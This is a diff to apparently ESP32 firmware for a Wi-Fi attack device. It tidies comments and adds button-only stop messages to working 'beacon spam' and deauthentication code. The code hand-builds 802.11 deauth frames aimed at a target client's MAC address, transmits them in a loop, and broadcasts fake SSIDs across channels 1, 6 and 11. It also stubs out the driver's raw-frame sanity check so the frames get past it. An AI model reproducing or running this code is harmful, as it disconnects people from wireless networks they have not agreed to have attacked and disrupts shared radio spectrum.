@@ -6,32 +6,16 @@
 #include "src.h"
 #include "inputManager.h"
 
-
-// Maksymalna liczba klientów, których można śledzić
 const int MAX_CLIENTS = 15;
 uint8_t target_mac[] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF};
-
-
-
-// Tablica do przechowywania adresów MAC klientów
 uint8_t network_clients[MAX_CLIENTS][6];
 int client_count = 0;
 int target_channel = 1;
-
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
   return 0;
 }
-
-// Flaga dla nowo wykrytych klientów
 bool new_clients_detected = false;
 
-extern "C" {
-#include "esp_wifi.h"
-  esp_err_t esp_wifi_set_channel(uint8_t primary, wifi_second_chan_t second);
-  esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
-}
-
-// Main function with non-constant SSID list passed as an argument
 void broadcastFakeSSIDs(String ssidList[], int ssidCount, bool sound) {
   // Configuration
   const uint8_t channels[] = {1, 6, 11}; // Wi-Fi channels to broadcast on
@@ -201,6 +185,7 @@ void broadcastFakeSSIDs(String ssidList[], int ssidCount, bool sound) {
 
 // Optimized version accepting C-style strings to avoid constructing Arduino Strings
 void broadcastFakeSSIDs(const char * const ssidList[], int ssidCount, bool sound) {
+  delay(250);
   const uint8_t channels[] = {1, 6, 11};
   const bool wpa2 = true;
   const bool appendSpaces = true;
@@ -306,7 +291,11 @@ void broadcastFakeSSIDs(const char * const ssidList[], int ssidCount, bool sound
 
     if (currentTime - packetRateTime > 1000) {
       packetRateTime = currentTime;
+      #ifdef BUTTON_ONLY_INPUT
+      drawInfoBox("Beacon spam", "Packets/sec: " + String(packetCounter) , "Press A or B to stop", false, false);
+      #else
       drawInfoBox("Beacon spam", "Packets/sec: " + String(packetCounter) , "Press ENTER to stop", false, false);
+      #endif
       logMessage("Packets/s: ");
       logMessage(String(packetCounter));
       packetCounter = 0;
@@ -314,25 +303,22 @@ void broadcastFakeSSIDs(const char * const ssidList[], int ssidCount, bool sound
   }
 }
 
-// Funkcja wysyłająca pakiety deauth do danego klienta
 bool send_deauth_packets(String &client_mac_str, int count, int delay_ms) {
   logMessage("Deauth active, paremeters: target: " + macToString(target_mac) + " client: " + client_mac_str + " count: " + String(count) + " delay: " + String(delay_ms));
   uint8_t client_mac[6];
-  
-  // Konwersja adresu MAC z string na tablicę bajtów
   if (!convert_mac_string_to_bytes(client_mac_str, client_mac)) {
     logMessage("Client MAC input error.");
     return false;
   }
 
   uint8_t deauth_packet[26] = {
-    0xC0, 0x00,   // Typ i podtyp ramki: deauth
-    0x3A, 0x01,   // Czas trwania
+    0xC0, 0x00,
+    0x3A, 0x01,
     target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5],  // MAC odbiorcy
     client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5],  // MAC nadawcy
     target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5],  // BSSID
-    0x00, 0x00,   // Numer sekwencji
-    0x01, 0x00    // Powód deautoryzacji
+    0x00, 0x00, 
+    0x01, 0x00  
   };
 
 
@@ -341,7 +327,7 @@ bool send_deauth_packets(String &client_mac_str, int count, int delay_ms) {
     esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
     xSemaphoreGive(wifiMutex);
     if (result == ESP_OK) {
-      delay(delay_ms); // Delay between packets
+      delay(delay_ms);
     } else {
       logMessage("Error sending packet. Counter: " + String(i) + " Error code: " + String(result));
     }
